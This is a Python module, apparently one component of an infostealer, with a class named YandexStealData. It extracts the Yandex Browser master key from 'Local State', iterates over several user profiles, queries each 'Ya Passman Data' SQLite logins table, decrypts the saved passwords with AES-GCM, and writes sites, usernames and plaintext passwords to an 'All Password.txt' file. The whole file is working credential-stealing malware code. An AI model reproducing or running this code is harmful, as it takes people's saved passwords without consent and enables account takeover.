import sqlite3
import os
import hashlib
import sys

#------------------------------------------------------------------------------
# sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from modules.Browsers.yandex.get_master_key_yandex import get_yandex_master_key, decrypt_aes_gcm

from modules.Browsers._data_breeding_ import Login



class YandexStealData:

    def __init__(self, yandex_user_data_path: str, _root_dir_: str) -> None:
        self._root_dir_ = _root_dir_
        local_state_file_path: str = os.path.join(yandex_user_data_path, "Local State")

        if not os.path.exists(local_state_file_path):
            return
        
        self.master_key: bytes = get_yandex_master_key(local_state_file_path)
        if self.master_key and len(self.master_key) == 32:

            # C:\Users\yoi\AppData\Local\Yandex\YandexBrowser\User Data\Default

            profiles: list[str] = [
                'Default',
                'Profile 1',
                'Profile 2',
                'Profile 3',
                'Profile 4',
                'Profile 5',
                'Person 1',
                'Person 2',
                'Person 3',
            ]

            for profile in profiles:

                yandex_ya_passman_data: str =  os.path.join(yandex_user_data_path, profile, "Ya Passman Data")

                if not os.path.exists(yandex_ya_passman_data):
                    continue
                
                self.extract_data_(yandex_ya_passman_data, profile)
                
    

    def extract_data_(self, db_path: str, profile: str) -> None:

        try:

            with sqlite3.connect(db_path) as con:
                curse = con.cursor()
                rows = curse.execute(
                    "SELECT origin_url, username_element, username_value, password_element, password_value, signon_realm FROM logins"
                )

                for row in rows.fetchall():
                    origin_url, username_element, username_value, password_element, password_value, signon_realm = row
                    str_to_hash = origin_url + "\x00" + username_element + "\x00" + username_value + "\x00" + password_element + "\x00" + signon_realm
                    hash_object = hashlib.sha1(str_to_hash.encode('utf-8'))
                    hash_result = hash_object.digest()

                    iv: bytes = password_value[:12]

                    password_valuee: bytes = password_value[12:]

                    password_decrypted: str = decrypt_aes_gcm(
                        password_valuee,
                        iv, 
                        self.master_key, 
                        hash_result
                    ).decode()
                   
                    if password_decrypted:
                        with open(f'{self._root_dir_}\\All Password.txt', "a", encoding='utf-8', errors='ignore') as allPassword:
                            h = Login("yandex", origin_url, username_value, password_decrypted, profile)
                            allPassword.write(str(h))
        except Exception as err:

            print(err)